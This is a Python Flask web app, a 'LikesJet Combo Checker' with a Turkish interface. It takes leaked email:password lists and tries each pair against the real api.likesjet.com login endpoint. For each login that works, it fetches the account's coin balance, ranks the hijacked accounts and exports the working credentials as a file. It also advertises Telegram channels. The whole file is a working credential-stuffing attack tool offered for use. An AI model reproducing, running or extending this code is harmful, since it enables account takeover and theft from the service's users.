from flask import Flask, request, render_template_string, jsonify
import requests

app = Flask(__name__)

HTML_PAGE = """<!DOCTYPE html>
<html lang="tr">
<head>
  <meta charset="UTF-8">
  <title>LikesJet Combo Checker</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background-color: #1e1e2f;
      color: #f0f0f0;
      display: flex;
      flex-direction: column;
      align-items: center;
      padding: 20px;
    }
    h1 {
      color: #ffcc00;
    }
    textarea {
      width: 90%;
      max-width: 800px;
      height: 200px;
      margin-bottom: 20px;
      padding: 10px;
      background-color: #2c2c3e;
      color: #f0f0f0;
      border: 1px solid #444;
      border-radius: 5px;
      resize: vertical;
    }
    button {
      background-color: #ffcc00;
      border: none;
      padding: 10px 20px;
      color: #1e1e2f;
      font-weight: bold;
      cursor: pointer;
      border-radius: 5px;
      margin-bottom: 20px;
    }
    .telegram-button {
      display: flex;
      align-items: center;
      background-color: #0088cc;
      color: white;
      padding: 10px 15px;
      border: none;
      border-radius: 5px;
      font-weight: bold;
      text-decoration: none;
      margin-top: 10px;
    }
    .telegram-button img {
      width: 20px;
      height: 20px;
      margin-right: 8px;
    }
    .output {
      width: 90%;
      max-width: 800px;
      background-color: #2c2c3e;
      border: 1px solid #444;
      padding: 10px;
      border-radius: 5px;
      margin-bottom: 20px;
    }
    .account {
      border-bottom: 1px solid #444;
      padding: 10px;
      margin-bottom: 10px;
    }
    .account:last-child {
      border-bottom: none;
    }
    .account p {
      margin: 5px 0;
    }
  </style>
</head>
<body>
  <h1>LikesJet Combo Checker</h1>
  <label for="combo">Combo (e-mail:şifre):</label>
  <textarea id="combo" placeholder="email1:pass1&#10;email2:pass2&#10;..."></textarea>
  <button onclick="kontrolEt()">Kontrol Et</button>
  <button onclick="downloadSuccessful()">Başarılı Hesapları İndir</button>
  <h3>Anlık Başarılı Girişler (Coin'e göre sıralı):</h3>
  <div class="output" id="sonuc"></div>
  
  <a href="https://t.me/jasontoolsk" class="telegram-button" target="_blank">
    <img src="https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg" alt="Telegram">
    Kanalımıza Katıl
  </a>
  
  <script>
    // Array to store successful account objects: {email, sifre, coin, user_id}
    let successfulAccounts = [];

    async function kontrolEt() {
      let comboTextarea = document.getElementById('combo');
      let allCombos = comboTextarea.value.split('\\n').filter(line => line.trim() !== "");
      let sonucDiv = document.getElementById('sonuc');

      // Process combos sequentially
      for (let i = 0; i < allCombos.length; i++) {
        let line = allCombos[i].trim();
        try {
          let response = await fetch('/caption', {
            method: 'POST',
            headers: {
              'Content-Type': 'application/json'
            },
            body: JSON.stringify({ combo: line })
          });
          let data = await response.json();
          if (data.success) {
            // Add account object to the successfulAccounts array
            successfulAccounts.push(data.result);
            // Sort accounts by coin in descending order
            successfulAccounts.sort((a, b) => b.coin - a.coin);
            renderAccounts();
          }
        } catch (e) {
          console.error("Hata:", e);
        }
        // Remove the processed combo from textarea
        allCombos.splice(i, 1);
        i--; // Adjust index after removal
        comboTextarea.value = allCombos.join('\\n');
      }
    }

    function renderAccounts() {
      let sonucDiv = document.getElementById('sonuc');
      sonucDiv.innerHTML = "";
      successfulAccounts.forEach(account => {
        const accDiv = document.createElement("div");
        accDiv.classList.add("account");
        accDiv.innerHTML = `
          <p><strong>E-mail:</strong> ${account.email}</p>
          <p><strong>Şifre:</strong> ${account.sifre}</p>
          <p><strong>Coin:</strong> ${account.coin}</p>
          <p><strong>Kullanıcı ID:</strong> ${account.user_id}</p>
          <p><small>Programmer: @gercekad | Channel: @batutool</small></p>
        `;
        sonucDiv.appendChild(accDiv);
      });
    }

    // Function to download successful accounts as a txt file
    function downloadSuccessful() {
      if (successfulAccounts.length === 0) {
        alert("Henüz başarılı hesap bulunamadı!");
        return;
      }
      // Format output as "email:password" for each successful account
      let content = successfulAccounts.map(acc => `${acc.email}:${acc.sifre}`).join('\\n');
      let blob = new Blob([content], { type: 'text/plain' });
      let url = window.URL.createObjectURL(blob);
      let a = document.createElement('a');
      a.href = url;
      a.download = 'basarili_hesaplar.txt';
      a.click();
      window.URL.revokeObjectURL(url);
    }
  </script>
</body>
</html>
"""

@app.route("/")
def index():
    return render_template_string(HTML_PAGE)

@app.route("/caption", methods=["POST"])
def caption():
    data = request.get_json()
    combo_line = data.get("combo", "").strip()
    if not combo_line:
        return jsonify({"success": False, "error": "Boş combo"}), 400

    parts = combo_line.split(":")
    if len(parts) < 2:
        return jsonify({"success": False, "error": "Geçersiz combo formatı"}), 400

    email = parts[0].strip()
    sifre = parts[1].strip()

    try:
        # Login request
        login_resp = requests.post(
            "https://api.likesjet.com/users/login",
            json={"email": email, "password": sifre},
            headers={
                "Content-Type": "application/json",
                "Accept": "application/json, text/plain, */*"
            },
            timeout=10
        )
        login_json = login_resp.json()
    except Exception as e:
        print(f"Login isteğinde hata: {e}")
        return jsonify({"success": False}), 500

    if login_json.get("status") and login_json.get("accessToken"):
        token = login_json["accessToken"]
        try:
            # Details request
            detay_resp = requests.get(
                "https://api.likesjet.com/users/details",
                headers={"Authorization": f"Bearer {token}"},
                timeout=10
            )
            detay_json = detay_resp.json()
        except Exception as e:
            print(f"Detay isteğinde hata: {e}")
            return jsonify({"success": False}), 500

        if detay_json.get("status") and detay_json.get("details") and detay_json["details"].get("coins", 0) > 0:
            coin = detay_json["details"]["coins"]
            user_id = detay_json["details"].get("id", "")
            # Return structured data to be used in UI
            result = {
                "email": email,
                "sifre": sifre,
                "coin": coin,
                "user_id": user_id
            }
            return jsonify({"success": True, "result": result})
    return jsonify({"success": False})
    
if __name__ == "__main__":
    app.run(debug=True)
